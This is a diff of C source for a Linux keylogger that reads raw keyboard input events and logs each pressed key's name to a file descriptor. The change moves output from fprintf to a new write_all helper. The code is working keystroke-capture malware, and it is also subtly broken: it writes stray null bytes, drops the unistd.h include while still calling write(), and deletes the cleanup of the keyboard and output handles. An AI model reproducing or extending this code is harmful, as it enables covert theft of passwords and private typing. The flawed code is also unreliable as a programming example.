@@ -1,7 +1,7 @@
 #include <linux/input.h>
 #include <stdio.h>
-#include <unistd.h>
 #include <signal.h>
+#include <string.h>
 #include "keylogger.h"
 
 #define BUFFER_SIZE 100
@@ -87,7 +87,28 @@ void sigint_handler(int sig){
     loop = 0;
 }
 
-void keylogger(int keyboard, FILE *writeout){
+/*
+ * Ensures that len characters of the string pointed to by str is written to
+ * the file with file descriptor file_desc. The string must be len characters
+ * long and null terminated.
+ *
+ * \returns 1 if writing completes succesfully, else 0
+ */
+int write_all(int file_desc, const char *str, int len){
+    int bytesWritten = 0;
+    int bytesToWrite = len + 1;
+
+    do {
+        bytesWritten = write(file_desc, str, bytesToWrite);
+        if(bytesWritten == -1) return 0;
+        bytesToWrite -= bytesWritten;
+        str += bytesWritten;
+    } while(bytesToWrite > 0);
+
+    return 1;
+}
+
+void keylogger(int keyboard, int writeout){
     int eventSize = sizeof(struct input_event);
     int bytesRead = 0;
     struct input_event events[NUM_EVENTS];
@@ -102,16 +123,14 @@ void keylogger(int keyboard, FILE *writeout){
             if(events[i].type == EV_KEY){
                 if(events[i].value == 1){
                     if(events[i].code > 0 && events[i].code < NUM_KEYCODES){
-                        fprintf(writeout, "%s\n", keycodes[events[i].code]);
+                        write_all(writeout, keycodes[events[i].code], strlen(keycodes[events[i].code]));
+                        write_all(writeout, "\n", 1);
                     }
                     else{
-                        fprintf(writeout, "%s\n", "KEY_UNRECOGNIZED");
+                        write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
                     }
                 }
             }
         }
     }
-
-    close(keyboard);
-    fclose(writeout);
 }
